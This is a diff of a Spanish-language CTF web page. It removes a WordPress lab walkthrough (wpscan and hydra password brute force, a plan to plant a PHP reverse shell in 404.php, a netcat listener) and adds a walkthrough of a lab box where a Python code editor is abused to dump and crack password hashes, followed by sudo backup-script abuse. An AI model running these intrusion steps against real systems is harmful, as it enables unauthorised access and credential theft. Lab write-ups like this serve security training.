@@ -92,339 +92,253 @@
   </p>
 
   <h2 id="gobuster">🔎 Escaneo con Nmap</h2>
+  <pre># nmap -sC -sV -T5 10.10.11.62
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 19:32 AST
+Warning: 10.10.11.62 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.62
+Host is up (0.076s latency).
+Not shown: 987 closed tcp ports (reset)
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
+|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
+|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
+1058/tcp  filtered nim
+3031/tcp  filtered eppc
+5000/tcp  open     http          Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Python Code Editor
+6112/tcp  filtered dtspc
+6699/tcp  filtered napster
+7001/tcp  filtered afs3-callback
+7937/tcp  filtered nsrexecd
+20000/tcp filtered dnp
+32782/tcp filtered unknown
+49176/tcp filtered unknown
+60020/tcp filtered unknown
+64623/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+<p>El primer paso fue realizar un escaneo con nmap -sC -sV -T5 para identificar servicios activos y versiones. La máquina respondió en el puerto 22 con un servicio OpenSSH 8.2p1, y en el puerto 5000 con un servidor Gunicorn 20.0.4, que sirve una aplicación web titulada Python Code Editor.</p>
+<p>Llamó la atención que varios puertos estaban en estado filtered, lo cual sugiere que podrían estar protegidos por un firewall o filtrados por reglas específicas del host. Esto limitó el reconocimiento, pero el servicio en el puerto 5000 se convirtió en el foco principal para continuar la enumeración y búsqueda de vectores de ataque.</p>
 
-  <pre>
-    nmap -sC -sV -vv -T5 10.10.162.140
-    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-15 19:54 AST
-    NSE: Loaded 156 scripts for scanning.
-    NSE: Script Pre-scanning.
-    NSE: Starting runlevel 1 (of 3) scan.
-    Initiating NSE at 19:54
-    Completed NSE at 19:54, 0.00s elapsed
-    NSE: Starting runlevel 2 (of 3) scan.
-    Initiating NSE at 19:54
-    Completed NSE at 19:54, 0.00s elapsed
-    NSE: Starting runlevel 3 (of 3) scan.
-    Initiating NSE at 19:54
-    Completed NSE at 19:54, 0.00s elapsed
-    Initiating Ping Scan at 19:54
-    Scanning 10.10.162.140 [4 ports]
-    Completed Ping Scan at 19:54, 0.40s elapsed (1 total hosts)
-    Initiating Parallel DNS resolution of 1 host. at 19:54
-    Completed Parallel DNS resolution of 1 host. at 19:54, 0.03s elapsed
-    Initiating SYN Stealth Scan at 19:54
-    Scanning 10.10.162.140 [1000 ports]
-    Discovered open port 443/tcp on 10.10.162.140
-    Discovered open port 80/tcp on 10.10.162.140
-    Completed SYN Stealth Scan at 19:55, 9.93s elapsed (1000 total ports)
-    Initiating Service scan at 19:55
-    Scanning 2 services on 10.10.162.140
-    Completed Service scan at 19:55, 14.08s elapsed (2 services on 1 host)
-    NSE: Script scanning 10.10.162.140.
-    NSE: Starting runlevel 1 (of 3) scan.
-    Initiating NSE at 19:55
-    Completed NSE at 19:55, 9.94s elapsed
-    NSE: Starting runlevel 2 (of 3) scan.
-    Initiating NSE at 19:55
-    Completed NSE at 19:55, 2.46s elapsed
-    NSE: Starting runlevel 3 (of 3) scan.
-    Initiating NSE at 19:55
-    Completed NSE at 19:55, 0.06s elapsed
-    Nmap scan report for 10.10.162.140
-    Host is up, received reset ttl 61 (0.25s latency).
-    Scanned at 2025-04-15 19:54:51 AST for 37s
-    Not shown: 997 filtered tcp ports (no-response)
-    PORT    STATE  SERVICE  REASON         VERSION
-    22/tcp  closed ssh      reset ttl 61
-    80/tcp  open   http     syn-ack ttl 61 Apache httpd
-    |_http-server-header: Apache
-    |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-    | http-methods: 
-    |_  Supported Methods: GET HEAD POST OPTIONS
-    |_http-title: Site doesn't have a title (text/html).
-    443/tcp open   ssl/http syn-ack ttl 61 Apache httpd
-    |_http-server-header: Apache
-    |_http-title: Site doesn't have a title (text/html).
-    | ssl-cert: Subject: commonName=www.example.com
-    | Issuer: commonName=www.example.com
-    | Public Key type: rsa
-    | Public Key bits: 1024
-    | Signature Algorithm: sha1WithRSAEncryption
-    | Not valid before: 2015-09-16T10:45:03
-    | Not valid after:  2025-09-13T10:45:03
-    | MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
-    | SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
-    | -----BEGIN CERTIFICATE-----
-    | MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
-    | d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
-    | MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
-    | MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
-    | sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
-    | yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
-    | KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
-    | 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
-    | ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
-    |_-----END CERTIFICATE-----
-    | http-methods: 
-    |_  Supported Methods: GET HEAD POST OPTIONS
-    |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-  </pre>
-  <p>El escaneo anterior encontró 3 puertos en la caja, pero solo 2 estaban abiertos, mientras que el Puerto 22 (SSH) está cerrado.</p>
-  <h2 id="gobuster">🌐 Enumeración Web</h2>
-  <p>
-    Si vas a la página de inicio del sitio web, hay alguna animación de arranque y después de que haya terminado hay muchas opciones en el mensaje del terminal.
-  </p>
-  <pre>
-    <img src="IMG/mr1.png">
-    </pre>
-  <p>Voy a usar Gobuster para realizar una enumeración de directorios ocultos en el servidor. Esta herramienta me permitirá identificar rutas no visibles en la página web, lo cual es útil para encontrar directorios o archivos que podrían tener información interesante o vulnerabilidades.</p>
-  <pre>gobuster dir -u 10.10.162.140 -w /usr/share/wordlists/dirb/common.txt
-    ===============================================================
-    Gobuster v3.6
-    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-    ===============================================================
-    [+] Url:                     http://10.10.162.140
-    [+] Method:                  GET
-    [+] Threads:                 10
-    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-    [+] Negative Status codes:   404
-    [+] User Agent:              gobuster/3.6
-    [+] Timeout:                 10s
-    ===============================================================
-    Starting gobuster in directory enumeration mode
-    ===============================================================
-    /.hta                 (Status: 403) [Size: 213]
-    /.htaccess            (Status: 403) [Size: 218]
-    /.htpasswd            (Status: 403) [Size: 218]
-    Progress: 130 / 4615 (2.82%)[ERROR] Get "http://10.10.162.140/_config": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-    [ERROR] Get "http://10.10.162.140/_conf": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-    [ERROR] Get "http://10.10.162.140/_css": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-    /0                    (Status: 301) [Size: 0] [--> http://10.10.162.140/0/]
-    /admin                (Status: 301) [Size: 235] [--> http://10.10.162.140/admin/]
-    /atom                 (Status: 301) [Size: 0] [--> http://10.10.162.140/feed/atom/]
-    /audio                (Status: 301) [Size: 235] [--> http://10.10.162.140/audio/]
-    /blog                 (Status: 301) [Size: 234] [--> http://10.10.162.140/blog/]
-    /css                  (Status: 301) [Size: 233] [--> http://10.10.162.140/css/]
-    /dashboard            (Status: 302) [Size: 0] [--> http://10.10.162.140/wp-admin/]
-    Progress: 1261 / 4615 (27.32%)[ERROR] Get "http://10.10.162.140/counters": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-    [ERROR] Get "http://10.10.162.140/coupon": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-    /favicon.ico          (Status: 200) [Size: 0]
-    /feed                 (Status: 301) [Size: 0] [--> http://10.10.162.140/feed/]
-    /Image                (Status: 301) [Size: 0] [--> http://10.10.162.140/Image/]
-    /image                (Status: 301) [Size: 0] [--> http://10.10.162.140/image/]
-    /images               (Status: 301) [Size: 236] [--> http://10.10.162.140/images/]
-    /index.html           (Status: 200) [Size: 1188]
-    /index.php            (Status: 301) [Size: 0] [--> http://10.10.162.140/]
-    /js                   (Status: 301) [Size: 232] [--> http://10.10.162.140/js/]
-    /intro                (Status: 200) [Size: 516314]
-    Progress: 2261 / 4615 (48.99%)[ERROR] Get "http://10.10.162.140/img2": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-    /license              (Status: 200) [Size: 309]
-    /login                (Status: 302) [Size: 0] [--> http://10.10.162.140/wp-login.php]
-    /page1                (Status: 301) [Size: 0] [--> http://10.10.162.140/]
-    /phpmyadmin           (Status: 403) [Size: 94]
-    /rdf                  (Status: 301) [Size: 0] [--> http://10.10.162.140/feed/rdf/]
-    /readme               (Status: 200) [Size: 64]
-    /robots               (Status: 200) [Size: 41]
-    /robots.txt           (Status: 200) [Size: 41]
-    /rss                  (Status: 301) [Size: 0] [--> http://10.10.162.140/feed/]
-    /rss2                 (Status: 301) [Size: 0] [--> http://10.10.162.140/feed/]
-    /sitemap              (Status: 200) [Size: 0]
-    /sitemap.xml          (Status: 200) [Size: 0]
-    /video                (Status: 301) [Size: 235] [--> http://10.10.162.140/video/]
-    /wp-admin             (Status: 301) [Size: 238] [--> http://10.10.162.140/wp-admin/]
-    /wp-config            (Status: 200) [Size: 0]
-    /wp-content           (Status: 301) [Size: 240] [--> http://10.10.162.140/wp-content/]
-    /wp-cron              (Status: 200) [Size: 0]
-    /wp-links-opml        (Status: 200) [Size: 227]
-    /wp-load              (Status: 200) [Size: 0]
-    /wp-login             (Status: 200) [Size: 2613]
-    /wp-includes          (Status: 301) [Size: 241] [--> http://10.10.162.140/wp-includes/]
-    /wp-mail              (Status: 500) [Size: 3064]
-    /wp-settings          (Status: 500) [Size: 0]
-    /wp-signup            (Status: 302) [Size: 0] [--> http://10.10.162.140/wp-login.php?action=register]
-    /xmlrpc.php           (Status: 405) [Size: 42]
-    /xmlrpc               (Status: 405) [Size: 42]
-  </pre>
-  <p>Este resultado de Gobuster muestra varios directorios y archivos que se encuentran en el servidor web. Aquí algunos puntos claves:</p>
-  <ul>
-   <li>Rutas encontradas: Se han encontrado varias rutas interesantes como /admin, /wp-admin, /login, /wp-content, y /wp-includes, las cuales están relacionadas con la administración de un sitio web basado en WordPress.</li>
-  </ul>
-   <ul>
-    <li>Respuestas HTTP: Las respuestas HTTP muestran que algunos directorios tienen código de estado 301 (Redirección), como /admin, /wp-admin, lo que indica que estas páginas pueden estar protegidas o redirigir a otras partes del sitio.</li>
-  </ul>
-  <ul>
-    <li>Archivos interesantes: Se encontraron archivos como robots.txt, sitemap.xml y wp-config, que podrían contener información útil sobre la estructura del sitio y configuración.</li>
-  </ul>
-  <pre>
-    <img src="IMG/mr2.png">
-  </pre>
-  <p>Al acceder a la ruta /wp-admin, se presenta una pantalla de inicio de sesión de WordPress. Probé con el nombre de usuario elliot y una contraseña aleatoria, lo que generó el mensaje: "ERROR: The password you entered for the username elliot is incorrect." Esto confirma que el usuario elliot existe en el sistema, por lo que el siguiente paso será intentar obtener su contraseña, posiblemente mediante fuerza bruta o revisando archivos expuestos que puedan contener credenciales.</p>
-  <pre>
-    <img src="IMG/mr3.png">
-  </pre>
-  <p>Al revisar el archivo robots.txt, encontré dos entradas interesantes: fsocity.dic, que parece ser un diccionario útil para realizar un ataque de fuerza bruta, y key-1-of-3.txt, que corresponde a la primera bandera del reto.</p>
-  <pre>
-    <img src="IMG/mr4.png">
-  </pre>
-  <p>Accedí a la ruta /fsocity.dic desde el navegador y confirmé que se trata de un diccionario de palabras, probablemente útil para un ataque de fuerza bruta. Sin embargo, noté que contiene muchas palabras repetidas, por lo que sería recomendable limpiarlo antes de usarlo.</p>
-  <pre>wget http://10.10.162.140/fsocity.dic
-    --2025-04-15 21:28:02--  http://10.10.162.140/fsocity.dic
-    Conectando con 10.10.162.140:80... conectado.
-    Petición HTTP enviada, esperando respuesta... 200 OK
-    Longitud: 7245381 (6.9M) [text/x-c]
-    Grabando a: «fsocity.dic»
-    
-    fsocity.dic               100%[===================================>]   6.91M   299KB/s    en 45s     
-    
-    2025-04-15 21:28:57 (159 KB/s) - «fsocity.dic» guardado [7245381/7245381]
-    </pre>
-    <p>Descargué el diccionario mencionado utilizando wget.</p>
-    <p>Como el diccionario fsocity.dic contenía muchas palabras repetidas, utilicé el siguiente comando para eliminar las duplicadas y obtener una lista limpia:</p>
-    <pre>sort fsocity.dic | uniq > fsocity-sorted.dic</pre>
-    <h2 id="gobuster">🔧 Explotación WordPress</h2>
-    <pre>wpscan --url http://10.10.162.140/ -U Elliot -P fsocity-sorted.dic
-      _______________________________________________________________
-               __          _______   _____
-               \ \        / /  __ \ / ____|
-                \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-                 \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-                  \  /\  /  | |     ____) | (__| (_| | | | |
-                   \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-      
-               WordPress Security Scanner by the WPScan Team
-                               Version 3.8.28
-             Sponsored by Automattic - https://automattic.com/
-             @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-      _______________________________________________________________
-      
-      [+] URL: http://10.10.162.140/ [10.10.162.140]
-      [+] Started: Wed Apr 16 13:29:16 2025
-      
-      Interesting Finding(s):
-      
-      [+] Headers
-       | Interesting Entries:
-       |  - Server: Apache
-       |  - X-Mod-Pagespeed: 1.9.32.3-4523
-       | Found By: Headers (Passive Detection)
-       | Confidence: 100%
-      
-      [+] robots.txt found: http://10.10.162.140/robots.txt
-       | Found By: Robots Txt (Aggressive Detection)
-       | Confidence: 100%
-      
-      [+] XML-RPC seems to be enabled: http://10.10.162.140/xmlrpc.php
-       | Found By: Direct Access (Aggressive Detection)
-       | Confidence: 100%
-       | References:
-       |  - http://codex.wordpress.org/XML-RPC_Pingback_API
-       |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
-       |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
-       |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
-       |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-      
-      [+] The external WP-Cron seems to be enabled: http://10.10.162.140/wp-cron.php
-       | Found By: Direct Access (Aggressive Detection)
-       | Confidence: 60%
-       | References:
-       |  - https://www.iplocation.net/defend-wordpress-from-ddos
-       |  - https://github.com/wpscanteam/wpscan/issues/1299
-      
-      [+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
-       | Found By: Emoji Settings (Passive Detection)
-       |  - http://10.10.162.140/98ee048.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
-       | Confirmed By: Meta Generator (Passive Detection)
-       |  - http://10.10.162.140/98ee048.html, Match: 'WordPress 4.3.1'
-      
-      [+] WordPress theme in use: twentyfifteen
-       | Location: http://10.10.162.140/wp-content/themes/twentyfifteen/
-       | Last Updated: 2025-04-15T00:00:00.000Z
-       | Readme: http://10.10.162.140/wp-content/themes/twentyfifteen/readme.txt
-       | [!] The version is out of date, the latest version is 4.0
-       | Style URL: http://10.10.162.140/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
-       | Style Name: Twenty Fifteen
-       | Style URI: https://wordpress.org/themes/twentyfifteen/
-       | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
-       | Author: the WordPress team
-       | Author URI: https://wordpress.org/
-       |
-       | Found By: Css Style In 404 Page (Passive Detection)
-       |
-       | Version: 1.3 (80% confidence)
-       | Found By: Style (Passive Detection)
-       |  - http://10.10.162.140/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
-      
-      [+] Enumerating All Plugins (via Passive Methods)
-      
-      [i] No plugins Found.
-      
-      [+] Enumerating Config Backups (via Passive and Aggressive Methods)
-       Checking Config Backups - Time: 00:00:10 <=> (137 / 137) 100.00% Time: 00:00:10
-      
-      [i] No Config Backups Found.
-      
-      [+] Performing password attack on Xmlrpc Multicall against 1 user/s
-      [SUCCESS] - Elliot / ER28-0652                                                                              
-      All Found                                                                                                   
-      Progress Time: 00:00:49 <===========================                       > (12 / 22) 54.54%  ETA: ??:??:??
-      
-      [!] Valid Combinations Found:
-       | Username: Elliot, Password: ER28-0652
-      
-      [!] No WPScan API Token given, as a result vulnerability data has not been output.
-      [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-      
-      [+] Finished: Wed Apr 16 13:30:50 2025
-      [+] Requests Done: 187
-      [+] Cached Requests: 6
-      [+] Data Sent: 1.63 MB
-      [+] Data Received: 1.496 MB
-      [+] Memory used: 313.766 MB
-      [+] Elapsed time: 00:01:34
-    </pre>
-    <p>Utilicé wpscan para lanzar un ataque de fuerza bruta al login de WordPress usando el usuario Elliot y el diccionario fsocity-sorted.dic que había encontrado anteriormente. Gracias a esta herramienta, logré descubrir las credenciales correctas: usuario: Elliot, contraseña: ER28-0652, lo que me permitió acceder al panel administrativo del sitio.</p>
-    
-    <h2 id="gobuster">🧰 Ataques de fuerza bruta</h2>
+<pre># gobuster dir -u http://10.10.11.62:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.62:5000/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/about                (Status: 200) [Size: 818]
+/login                (Status: 200) [Size: 730]
+/register             (Status: 200) [Size: 741]
+/logout               (Status: 302) [Size: 189] [--> /]
+/codes                (Status: 302) [Size: 199] [--> /login]
+</pre>
+<p>El escaneo reveló varias rutas interesantes podemos encontrar que 2 puertos están escuchando, vamos a revisar 10.10.11.62:5000.:</p>
+<pre>
+  <img src="code1.png">
+</pre>
+<p>Al acceder a la aplicación web en el puerto 5000, se presenta un entorno interactivo de ejecución de código Python en tiempo real. El entorno permite escribir código en un editor del lado izquierdo, y al hacer clic en el botón "Run", los resultados se imprimen en el área derecha.</p>
+<p>⚠️ Esto representa una superficie de ataque crítica, ya que si el servidor no implementa un entorno seguro y aislado (sandboxing) para ejecutar el código, podría ser vulnerable a Remote Code Execution (RCE).</p>
 
-    <pre>hydra -l Elliot -P fsocity-sorted.dic 10.10.162.140 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR" -t 30
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+<pre>
+  <img src="code2.png">
+</pre>
+<p>Mediante la ejecución del siguiente código en el entorno de ejecución vulnerable:</p>
+<pre>print([(user.id, user.username, user.password) for user in User.query.all()])</pre>
+<p>Se logró obtener una lista completa de usuarios registrados en la base de datos, incluyendo sus nombres de usuario y hashes de contraseñas:</p>
+<pre>[(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'),
+ (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]
+</pre>
+<ul><li>Se confirma que el entorno de ejecución tiene acceso directo al modelo de datos y puede interactuar con el ORM (probablemente SQLAlchemy).</li></ul>
+<ul><li>Las contraseñas no están en texto plano, pero los hashes pueden ser sometidos a ataques de fuerza bruta o cracking con herramientas como John the Ripper o Hashcat.</li></ul>
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-17 08:01:31
-[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
-[DATA] attacking http-post-form://10.10.118.123:80/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR
-[STATUS] 1259.00 tries/min, 1259 tries in 00:01h, 10193 to do in 00:09h, 30 active
-[STATUS] 792.67 tries/min, 2378 tries in 00:03h, 9074 to do in 00:12h, 30 active
-[STATUS] 651.57 tries/min, 4561 tries in 00:07h, 6891 to do in 00:11h, 30 active
-[80][http-post-form] host: 10.10.118.123   login: Elliot   password: ER28-0652
-1 of 1 target successfully completed, 1 valid password found
+<pre># john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt user.hash
 
-    </pre>
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+development      (?)     
+nafeelswordsmaster (?)     
+2g 0:00:00:00 DONE (2025-05-19 21:49) 2.469g/s 6453Kp/s 6453Kc/s 6703KC/s nafi1993..naerox
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+</pre>
+<p>Una vez obtenidos los hashes desde la base de datos, fueron guardados en un archivo llamado user.hash con el siguiente contenido:</p>
+<pre>759b74ce43947f5f4c91aeddc3e5bad3
+3de6f30c4a09c27fc71932bfc68474be
+</pre>
+<p>Se utilizó John the Ripper junto a la famosa wordlist rockyou.txt para realizar el cracking de los hashes con el siguiente comando:</p>
+<pre>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt user.hash</pre>
+<p>Resultados:</p>
+<pre>development : development
+martin      : nafeelswordsmaster
+</pre>
 
-    <p>Tambien podemos obtener la contraseña por medio de fuerza bruta, utilicé Hydra para realizar un ataque de fuerza bruta contra el formulario de inicio de sesión de WordPress. Empleé el usuario Elliot y el diccionario fsocity-sorted.dic, previamente recolectado durante la enumeración. Tras varios intentos, Hydra logró identificar las credenciales válidas: usuario: Elliot, contraseña: ER28-0652. Con esta información pude acceder al panel de administración de WordPress.</p>
-    <h2 id="gobuster">💻 Reverse Shell en PHP</h2>
-    <pre>
-      <img src="IMG/mr5.png">
-    </pre>
-    <p>logré acceder exitosamente al panel de administración de WordPress mediante el usuario Elliot y la contraseña ER28-0652. En la imagen se muestra el panel principal (Dashboard) correspondiente a WordPress versión 4.3.1, utilizando el tema predeterminado Twenty Fifteen.
+<pre># ssh martin@10.10.11.62
+The authenticity of host '10.10.11.62 (10.10.11.62)' can't be established.
+ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.62' (ED25519) to the list of known hosts.
+martin@10.10.11.62's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
 
-     Este acceso representa un punto crítico en el compromiso del sistema, ya que desde esta interfaz administrativa es posible gestionar contenido, usuarios, plugins, y configuraciones del sitio. Además, abre la posibilidad de escalar privilegios o introducir código malicioso mediante la instalación de plugins o edición de archivos del tema.</p>
-    <pre>
-      <img src="IMG/mr8.png">
-    </pre>
-     <p>Con acceso al panel de administración de WordPress, navegué hasta el editor de temas en Appearance > Editor. Desde aquí es posible modificar directamente los archivos del tema activo, en este caso Twenty Fifteen. Esta funcionalidad representa una excelente oportunidad para ejecutar código malicioso en el servidor.</p>
-    <p>Específicamente, el archivo 404.php es una ubicación comúnmente utilizada para inyectar una reverse shell, ya que puede ser invocado fácilmente al acceder a una ruta inexistente en el sitio web. </p>
-    <pre>
-      <img src="IMG/mr9.png">
-    </pre>
-    
-    <p>Para establecer una conexión remota con el sistema comprometido, se optó por utilizar una reverse shell en PHP desarrollada por PentestMonkey, una herramienta ampliamente conocida y utilizada en entornos de pruebas de penetración. Este script, php-reverse-shell.php, permite iniciar una conexión inversa desde el servidor víctima hacia el atacante, proporcionando una shell remota interactiva.</p>
-    <p>Antes de implementarla, es necesario modificar las variables $ip y $port con la dirección IP del atacante y el puerto de escucha configurado en la máquina local, típicamente usando herramientas como netcat. Una vez cargada en el servidor (por ejemplo, dentro del archivo 404.php del tema activo en WordPress), se ejecuta al acceder al recurso correspondiente, estableciendo la sesión de control.</p>
-    <pre>
-      <img src="IMG/mr10.png">
-    </pre>
-    <p> se modificaron las variables $ip y $port del archivo php-reverse-shell.php, estableciendo como valores la dirección IP del atacante y el puerto 443. Este puerto fue elegido debido a que es comúnmente utilizado para tráfico HTTPS, lo que puede facilitar el paso del tráfico a través de firewalls o mecanismos de filtrado sin levantar sospechas.</p>
-    <h2 id="gobuster">👤 Acceso como usuario</h2>
-    <p>Pongamos a Netcat a la escucha por el puerto que especificamos en la reverse shell con el siguiente comando:</p>
-    <pre> nc -lvnp 443</pre>
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue 20 May 2025 01:53:27 AM UTC
+
+  System load:  0.01              Processes:             250
+  Usage of /:   54.6% of 5.33GB   Users logged in:       2
+  Memory usage: 20%               IPv4 address for eth0: 10.10.11.62
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue May 20 01:53:28 2025 from 10.10.14.137
+martin@code:~$ 
+</pre>
+<p>Accedemos con acceso remoto vía SSH al servidor 10.10.11.62 como el usuario martin con la contraseña nafeelswordsmaster.</p>
+
+<pre>martin@code:~$ sudo -l
+Matching Defaults entries for martin on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+</pre>
+<p>Ejecutamos sudo -l para listar qué comandos puede ejecutar el usuario martin con sudo sin pedir contraseña.</p>
+<p>La salida nos indica que martin puede ejecutar sin restricciones el script /usr/bin/backy.sh usando sudo, sin necesidad de introducir su contraseña.</p>
+
+<pre>martin@code:~/backups$ cat task.json
+{
+        "destination": "/home/martin/backups/",
+        "multiprocessing": true,
+        "verbose_log": false,
+        "directories_to_archive": [
+                "/home/app-production/app"
+        ],
+
+        "exclude": [
+                ".*"
+        ]
+}
+</pre>
+<p>Este archivo JSON especifica la configuración de un script o aplicación que probablemente genera backups comprimidos de ciertos directorios.</p>
+
+<pre>martin@code:~/backups$ nano task.json 
+
+{
+        "destination": "/home/martin/backups/",
+        "multiprocessing": true,
+        "verbose_log": false,
+        "directories_to_archive": [
+                "/home/app-production/user.txt"
+        ],
+
+        "exclude": [
+                ".*"
+        ]
+}</pre>
+<p>Cambiemos la task.json para obtener user.txt</p>
+
+<pre>martin@code:~/backups$ sudo /usr/bin/backy.sh ./task.json
+2025/05/20 02:10:30 🍀 backy 1.2
+2025/05/20 02:10:30 📋 Working with ./task.json ...
+2025/05/20 02:10:30 💤 Nothing to sync
+2025/05/20 02:10:30 📤 Archiving: [/home/app-production/user.txt]
+2025/05/20 02:10:30 📥 To: /home/martin/backups ...
+2025/05/20 02:10:30 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_home_app-production_usert.txt_2025_May.tar.bz2  task.json
+martin@code:~/backups$ 
+</pre>
+<p>Ejecutamos el script /usr/bin/backy.sh usando sudo con el archivo de configuración task.json como argumento.</p>
+<p>El script indica que no hay archivos nuevos para sincronizar ("Nothing to sync"), pero procede a crear un archivo de respaldo (backup) de la carpeta /home/app-production/app.</p>
+<p>El archivo generado se guarda en /home/martin/backups con un nombre que incluye la fecha y el origen del backup (code_home_app-production_user.txt_2025_May.tar.bz2).</p>
+
+<pre>martin@code:~/backups$ tar -xjf ./code_home_app-production_user.txt_2025_May.tar.bz2
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2    home
+code_home_app-production_user.txt_2025_May.tar.bz2  task.json
+martin@code:~/backups$ cd home
+martin@code:~/backups/home$ ls
+app-production
+martin@code:~/backups/home$ cd app-production
+martin@code:~/backups/home/app-production$ ls
+user.txt
+</pre>
+<p>Ejecutamos el comando tar -xjf para descomprimir el archivo code_home_app-production_user.txt_2025_May.tar.bz2, que contiene un respaldo comprimido.
+Al listar el directorio después de la extracción, aparece una nueva carpeta llamada home.</p>
